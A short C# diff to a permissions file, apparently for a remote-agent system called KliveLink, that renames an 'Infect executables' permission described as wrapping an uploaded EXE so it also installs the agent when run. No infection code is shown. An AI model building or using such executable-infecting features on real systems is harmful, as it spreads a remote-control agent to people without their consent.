@@ -1,4 +1,4 @@
-namespace Omnipotent.Profiles.Permissions
+﻿namespace Omnipotent.Profiles.Permissions
 {
     [PermissionSet]
     public static class KliveLinkPerms
@@ -47,8 +47,9 @@ namespace Omnipotent.Profiles.Permissions
             "View command audit", "Read the immutable command and purge audit trail.",
             ProfileRank.Klives, implies: new[] { "agents.view" }, sensitive: true);
 
-        public static readonly PermissionDef Infect = G.Define("infect", "Infect", PermissionTier.Critical,
+        public static readonly PermissionDef Infect = G.Define("agents.infect", "Infect", PermissionTier.Critical,
             "Infect executables", "Upload an EXE and receive a copy that also installs KliveLink when run.",
             ProfileRank.Klives, implies: new[] { "agents.control" }, sensitive: true);
     }
 }
+
